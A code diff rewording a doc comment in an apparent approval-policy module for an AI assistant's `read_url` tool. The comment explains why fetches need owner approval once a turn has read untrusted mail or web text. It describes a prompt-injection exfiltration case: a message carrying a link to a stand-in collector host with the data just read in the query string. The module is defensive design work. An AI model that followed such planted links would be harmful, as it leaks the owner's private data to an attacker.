@@ -1,18 +1,18 @@
 /**
- * W7D-s3 — a link met after somebody else's words is a decision, not a read.
+ * A link met after somebody else's words is a decision, not a read.
  *
  * WHAT THIS DEFENDS AGAINST. The chief of staff has no file, shell or web-search tool: every one
  * of `agent/tools/{bash,read_file,write_file,web_fetch,web_search,agent,task_cancel}.ts` is a
  * `disableTool()` sentinel. The one path left that turns untrusted TEXT into an outbound REQUEST
  * on the owner's behalf is `read_url`, whose readability worker will fetch any host. So the
- * cheapest exfiltration in this box is an address inside someone else's message: a mail that says
+ * cheapest exfiltration on this server is an address inside someone else's message: a mail that says
  * "for details see https://collector.example/?d=<what you just read>", opened in the same turn it
  * was read in. Nothing about that call looks unusual — it is a read tool doing a read.
  *
  * SO THE FETCH ASKS, BUT ONLY WHERE IT IS A DECISION. The question this policy answers is not
  * "is this link safe" (unanswerable) but "has this turn already read words the owner did not
  * write". A turn where it has not — the owner pasting a link and asking what is on the page — is
- * exactly as it was before this module existed: one call, no card (owner decision D1). A turn
+ * exactly as it was before this module existed: one call, no card. A turn
  * where it has gets one card per call, naming the whole address
  * (`approval-summary.ts`'s `read_url` formatter).
  *
@@ -23,7 +23,7 @@
  * the turn that read the mail is over. An approval policy runs in the ORIGINAL turn, before the
  * park, which is the only place this question can still be asked.
  *
- * THE TAINT IS READ, NEVER RE-DERIVED. "Tainted" means exactly what waves 3–4 recorded: an entry
+ * THE TAINT IS READ, NEVER RE-DERIVED. "Tainted" means exactly what the origin model records: an entry
  * in `origin-taint.ts`'s per-turn map, written by `agent/hooks/origin-taint.ts` on a tool result
  * from `gmail_read` / `gmail_search` / `read_url`, and by the handful of tools that classify
  * themselves more precisely at their own call site. There is no second heuristic here — a new
@@ -38,7 +38,7 @@
  * re-stamps a durable approval descriptor by CALLING `tool.approval`
  * (`(valueOf(name).approval as (...a) => unknown)(...args)`), so an object here would be called
  * as a function and eve would drop the whole resolver result — the incident where a role went
- * from 77 tools to 4 with every build green. Recorded in the wave-7 plan as finding 7.
+ * from 77 tools to 4 with every build green.
  *
  * MODULE SCOPE IS INERT: `eve build` evaluates every module with no secrets and no database.
  */
